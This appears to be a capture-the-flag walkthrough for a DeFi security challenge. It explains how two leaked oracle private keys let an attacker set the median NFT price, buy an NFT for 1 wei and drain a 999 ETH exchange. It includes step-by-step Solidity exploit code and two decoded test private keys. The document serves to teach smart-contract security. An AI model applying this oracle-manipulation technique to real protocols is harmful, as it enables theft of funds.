## Challenge 7 Walkthrough: Compromised

### Vulnerability

The vulnerability is **off-chain private key leakage** — two of the three oracle source private keys are embedded in an HTTP server response. On-chain, `TrustfulOracle` grants price-posting authority purely by address role:

```solidity
function postPrice(string calldata symbol, uint256 newPrice)
    external onlyRole(TRUSTED_SOURCE_ROLE)
{
    _setPrice(msg.sender, symbol, newPrice);
}
```

Whoever holds the private key controls that oracle source. With 2 of 3 sources compromised, an attacker has permanent majority control over the median price calculation:

```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    if (prices.length % 2 == 0) {
        return (prices[(prices.length / 2) - 1] + prices[prices.length / 2]) / 2;
    } else {
        return prices[prices.length / 2]; // ← index 1 of 3 — the middle value
    }
}
```

With 3 sources, the median is always `prices[1]` after sorting. Controlling 2 of 3 reporters means the attacker controls at least 2 of the 3 values — enough to set the median to any value regardless of what the third source reports.

The exchange trusts this median unconditionally:

```solidity
uint256 price = oracle.getMedianPrice(token.symbol());
if (msg.value < price) revert InvalidPayment();   // buyOne
if (address(this).balance < price) revert NotEnoughFunds(); // sellOne
payable(msg.sender).sendValue(price);              // sellOne pays out
```

### Exploit

#### Step 0 — Decode the Leaked Private Keys

The HTTP response contains two space-separated hex strings. The decode chain:

```
Remove spaces → hex bytes → interpret as ASCII characters
→ that ASCII string is Base64-encoded → Base64 decode → raw private key bytes
```

```
Leak 1: 4d 48 67 33 5a 44 45 31 59 6d 4a 68 ...
        → ASCII: "MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2Rj..."
        → Base64 decode → 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744

Leak 2: 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 ...
        → ASCII: "MHg2OGJkMDIwYWQxODZiNjQ3YTY5MW..."
        → Base64 decode → 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
```

`vm.addr(privateKey)` confirms these correspond to `sources[0]` and `sources[1]` — two of the three trusted reporters.

#### Step 1 — Crash the NFT Price to 0

```solidity
vm.prank(source1); oracle.postPrice("DVNFT", 0);
vm.prank(source2); oracle.postPrice("DVNFT", 0);
```

Sorted prices: `[0, 0, 999e18]`. Median = `prices[1]` = `0`.

#### Step 2 — Buy One NFT for 1 Wei

```solidity
CompromisedAttacker attacker = new CompromisedAttacker{value: player.balance}(...);
attacker.buy(); // exchange.buyOne{value: 1}()
```

`buyOne` requires `msg.value > 0` — sending `0` reverts with `InvalidPayment`. Sending 1 wei satisfies this; since `price = 0`, the full 1 wei is returned as change via `payable(msg.sender).sendValue(msg.value - price)`. The NFT is minted to the attacker contract. `CompromisedAttacker` implements `IERC721Receiver` so `safeMint` can complete successfully.

#### Step 3 — Inflate the Price to 999 ETH

```solidity
vm.prank(source1); oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE); // 999e18
vm.prank(source2); oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
```

All three sources now report 999 ETH. Sorted prices: `[999, 999, 999]`. Median = 999 ETH — exactly equal to the exchange's balance, so `sellOne` will pass the `NotEnoughFunds` check and pay out the complete balance.

#### Step 4 — Sell the NFT, Draining the Exchange

```solidity
attacker.sell();
// nft.approve(address(exchange), nftId)
// exchange.sellOne(nftId) → pays 999 ETH, burns the NFT
```

`sellOne` verifies ownership and approval, transfers the NFT to the exchange, **burns it** (`token.burn(id)`), and sends 999 ETH to the seller. The exchange is empty. The NFT no longer exists — satisfying `_isSolved()`'s `nft.balanceOf(player) == 0` check (player never held the NFT; the attacker contract did, and it was burned).

#### Step 5 — Restore the Oracle Price

```solidity
vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
```

`_isSolved()` asserts `oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE`. Without this step the test passes all ETH checks but fails the price check. Restoring both sources to 999 ETH returns the median to 999 ETH.

#### Step 6 — Transfer to Recovery

```solidity
attacker.recover(); // payable(recovery).transfer(address(this).balance)
```

### Why It Works

The root cause is off-chain data leakage exposing oracle private keys. The oracle's access control model correctly restricts `postPrice` to `TRUSTED_SOURCE_ROLE` — but role assignment is based on address, and address ownership is entirely a function of private key possession. There is no on-chain way to detect that a key has been compromised.

The median mechanism was designed to tolerate a single malicious reporter. It is not resistant to two — and with 2 of 3 keys exposed, an attacker can set the median to any value by making both compromised sources agree, regardless of what the honest third source reports.

The fix is not on-chain. It requires rotating the compromised oracle source addresses (revoking `TRUSTED_SOURCE_ROLE` and granting it to new keypairs), combined with off-chain operational security to prevent key leakage in the first place.

This is an **oracle manipulation via off-chain key compromise** attack — no flash loans, no reentrancy, no code vulnerability. The entire attack surface is key management.
